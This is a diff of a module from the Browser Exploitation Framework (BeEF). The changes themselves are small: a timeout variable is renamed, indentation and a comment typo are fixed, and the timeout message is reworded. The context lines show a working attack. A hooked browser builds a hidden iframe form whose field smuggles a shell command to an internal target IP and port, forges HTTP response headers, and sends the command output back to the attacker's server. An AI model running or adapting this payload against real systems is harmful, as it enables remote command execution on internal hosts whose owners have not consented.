@@ -18,9 +18,9 @@ beef.execute(function() {
 	var target_ip = "<%= @ip %>";
 	var target_port = "<%= @port %>";
 	var cmd = '<%= @cmd %>';
-	var command_timeout = "<%= @command_timeout %>";
+	var timeout = "<%= @command_timeout %>";
 	var internal_counter = 0;
-    var result_size = "<%= @result_size %>";
+	var result_size = "<%= @result_size %>";
 
 	// create iframe
 	var iframe = document.createElement("iframe");
@@ -52,11 +52,10 @@ beef.execute(function() {
 		myExt.setAttribute("value","echo -e HTTP/1.1 200 OK\\\\r;echo -e Content-Type: text/html\\\\r;echo -e Content-Length: "+(body1.length+cmd.length+body2.length+size*1)+"\\\\r;echo -e Keep-Alive: timeout=5,max=100\\\\r;echo -e Connection: keep-alive\\\\r;echo -e \\\\r;echo \""+body1+"\";(" + cmd + ")|head -c "+size+" ; ");
 		myform.appendChild(myExt);
 
-        // Adding puffer space for the command result
+		// Adding buffer space for the command result
 		end_talkback=" echo -e \""+body2;
-        while(--size) end_talkback+=" ";
-        end_talkback+="\" \\\\r ;";
-
+		while(--size) end_talkback+=" ";
+		end_talkback+="\" \\\\r ;";
 
 		// post js to call home and close connection
 		myExt2 = document.createElement("INPUT");
@@ -81,8 +80,8 @@ beef.execute(function() {
 			} else throw("command results haven't been returned yet");
 		} catch (e) {
 			internal_counter++;
-			if (internal_counter > command_timeout) {
-				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=time out');
+			if (internal_counter > timeout) {
+				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Timeout after '+timeout+' seconds');
 				document.body.removeChild(iframe);
 				return;
 			}
